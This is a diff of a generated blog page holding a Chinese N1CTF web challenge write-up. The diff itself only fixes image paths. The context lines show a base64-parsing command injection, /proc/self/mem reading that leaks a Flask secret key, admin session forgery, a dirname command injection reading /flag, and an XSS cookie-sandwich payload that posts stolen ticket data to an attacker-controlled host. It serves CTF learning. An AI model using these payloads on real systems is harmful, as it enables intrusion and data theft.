@@ -26,23 +26,23 @@
 <meta property="og:site_name" content="onehang&#39;s blogs">
 <meta property="og:description" content="ping分析代码，显然需要在 1command &#x3D; f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;&#123;ip_base64&#125;&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;  进行命令执行，只需要让$(echo ‘{ip_base64}’ | base64 -d)  –&amp;gt">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp//images/image-20250914232153626.png">
-<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp//images/image-20250914232401063.png">
-<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp//images/image-20250914232507326.png">
-<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp//images/image-20250914234321695.png">
-<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp//images/image-20250915001049199.png">
-<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp//images/image-20250915003503909.png">
-<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp//images/image-20250915003552152.png">
-<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp//images/image-20250915205435704.png">
+<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp/images/image-20250914232153626.png">
+<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp/images/image-20250914232401063.png">
+<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp/images/image-20250914232507326.png">
+<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp/images/image-20250914234321695.png">
+<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp/images/image-20250915001049199.png">
+<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp/images/image-20250915003503909.png">
+<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp/images/image-20250915003552152.png">
+<meta property="og:image" content="http://example.com/2025/09/15/n1ctf-web-wp/images/image-20250915205435704.png">
 <meta property="article:published_time" content="2025-09-15T13:18:53.000Z">
-<meta property="article:modified_time" content="2025-09-15T14:14:49.698Z">
+<meta property="article:modified_time" content="2025-09-15T14:18:08.345Z">
 <meta property="article:author" content="onehang">
 <meta property="article:tag" content="base64解码差异">
 <meta property="article:tag" content="&#x2F;proc&#x2F;self&#x2F;maps&amp;mem文件">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="xss三明治攻击">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2025/09/15/n1ctf-web-wp//images/image-20250914232153626.png">
+<meta name="twitter:image" content="http://example.com/2025/09/15/n1ctf-web-wp/images/image-20250914232153626.png">
   
   
   
@@ -296,13 +296,13 @@
 <p>尝试绕过正则无果   观察到明明一开始就对ip_base64进行了一次base64解码，但是在命令执行的时候明明可以直接使用却还要解码一次，猜测是两种解码方式的差异</p>
 <p>思路是让python的base64.b64decode()函数只解析出前面的ip地址，而bash在base64 -d 的时候解析出完整的拼接后的命令</p>
 <p>分析python b64decode函数的源码发现底层由c实现，注意到如下代码</p>
-<p><img src="/2025/09/15/n1ctf-web-wp//images/image-20250914232153626.png" srcset="/img/loading.gif" lazyload alt="image-20250914232153626"></p>
+<p><img src="/2025/09/15/n1ctf-web-wp//../images/image-20250914232153626.png" srcset="/img/loading.gif" lazyload alt="image-20250914232153626"></p>
 <p>也就是当python解析到&#x3D;&#x3D;之后如果后面还有内容，在严格模式下会报错，而非严格模式下会停止解析但不会报错，可以试验一下</p>
-<p><img src="/2025/09/15/n1ctf-web-wp//images/image-20250914232401063.png" srcset="/img/loading.gif" lazyload alt="image-20250914232401063"></p>
+<p><img src="/2025/09/15/n1ctf-web-wp//../images/image-20250914232401063.png" srcset="/img/loading.gif" lazyload alt="image-20250914232401063"></p>
 <p>python成功只解码出了1.1.1.1，而bash却能解析出完整的命令</p>
-<p><img src="/2025/09/15/n1ctf-web-wp//images/image-20250914232507326.png" srcset="/img/loading.gif" lazyload alt="image-20250914232507326"></p>
+<p><img src="/2025/09/15/n1ctf-web-wp//../images/image-20250914232507326.png" srcset="/img/loading.gif" lazyload alt="image-20250914232507326"></p>
 <p>利用这个就能绕过检测并且拼接执行命令了，直接cat &#x2F;flag即可，如下图</p>
-<p><img src="/2025/09/15/n1ctf-web-wp//images/image-20250914234321695.png" srcset="/img/loading.gif" lazyload alt="image-20250914234321695"></p>
+<p><img src="/2025/09/15/n1ctf-web-wp//../images/image-20250914234321695.png" srcset="/img/loading.gif" lazyload alt="image-20250914234321695"></p>
 <h1 id="Peek-a-Fork"><a href="/2025/09/15/n1ctf-web-wp/#Peek-a-Fork" class="headerlink" title="Peek a Fork"></a>Peek a Fork</h1><p>代码审计</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br>mm = mmap.mmap(-<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(flag))<br>mm.write(flag)<br>os.remove(<span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
@@ -331,7 +331,7 @@
 <p>会发现返回invalid path</p>
 <p>查了一下发现是因为读取mem文件有权限要求，有些不可读的部分，只能读取有权限的部分，这里可以通过offset和length来控制</p>
 <p>读一下&#x2F;proc&#x2F;self&#x2F;maps文件查看python进程的内存地址</p>
-<p><img src="/2025/09/15/n1ctf-web-wp//images/image-20250915001049199.png" srcset="/img/loading.gif" lazyload alt="image-20250915001049199"></p>
+<p><img src="/2025/09/15/n1ctf-web-wp//../images/image-20250915001049199.png" srcset="/img/loading.gif" lazyload alt="image-20250915001049199"></p>
 <p>这里选择从7f7861a02000（140155010686976）爆破到7ffc799d2000（140722348826624），把内存地址转换为十进制数然后传给offset参数设置一下步长，爆破速度挺快的</p>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">offset</span>=<span class="hljs-number">140155010686976</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>/pro?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>c/self/mem<br></code></pre></td></tr></table></figure>
 
@@ -361,10 +361,10 @@
 
 
 
-<p><img src="/2025/09/15/n1ctf-web-wp//images/image-20250915003503909.png" srcset="/img/loading.gif" lazyload alt="image-20250915003503909"></p>
+<p><img src="/2025/09/15/n1ctf-web-wp//../images/image-20250915003503909.png" srcset="/img/loading.gif" lazyload alt="image-20250915003503909"></p>
 <p>FLASK_SECRET_KEY&#x3D;#mu0cw9F#7bBCoF! </p>
 <p>接下来利用这个key生成一个admin的session再替换我们自己注册的用户的session</p>
-<p><img src="/2025/09/15/n1ctf-web-wp//images/image-20250915003552152.png" srcset="/img/loading.gif" lazyload alt="image-20250915003552152"></p>
+<p><img src="/2025/09/15/n1ctf-web-wp//../images/image-20250915003552152.png" srcset="/img/loading.gif" lazyload alt="image-20250915003552152"></p>
 <p>用户变为admin之后发现上传文件时多了一个指定dirname的输入框，随便上传一个文件同时传入</p>
 <p>dirname&#x3D;test; cat &#x2F;flag* &gt; .&#x2F;uploads&#x2F;test&#x2F;flag.txt</p>
 <p>再访问&#x2F;download&#x2F;test&#x2F;flag.txt就能拿到flag</p>
@@ -390,7 +390,7 @@
 <p>payload</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;http://localhost/ticket&quot;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`$Version=1; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=<span class="hljs-subst">$&#123;url.pathname&#125;</span>;`</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`ticket=&quot;abc; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=<span class="hljs-subst">$&#123;url.pathname&#125;</span>;`</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`aaa=bbb&quot;; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=/;`</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/ticket&quot;</span>, &#123;<br>        <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>,<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://xxx.xx.xx.xxx:7777/&quot;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>                <span class="hljs-attr">body</span>: data,<br>        &#125;);<br>&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/09/15/n1ctf-web-wp//images/image-20250915205435704.png" srcset="/img/loading.gif" lazyload alt="image-20250915205435704"></p>
+<p><img src="/2025/09/15/n1ctf-web-wp//../images/image-20250915205435704.png" srcset="/img/loading.gif" lazyload alt="image-20250915205435704"></p>
 <p>因为在访问&#x2F;ticket的时候会回显自己的ticket的值，再把请求结果拿出来传到自己的服务器上就能看到flag了</p>
 <h2 id="分析"><a href="/2025/09/15/n1ctf-web-wp/#分析" class="headerlink" title="分析"></a>分析</h2><p>这题比赛中没打出来，当时想到了xss，但是看到httponly不知道有三明治攻击这个东西，也没注意到写错了</p>
 <p>并且也没仔细去阅读代码，nginx的配置文件没认真看</p>
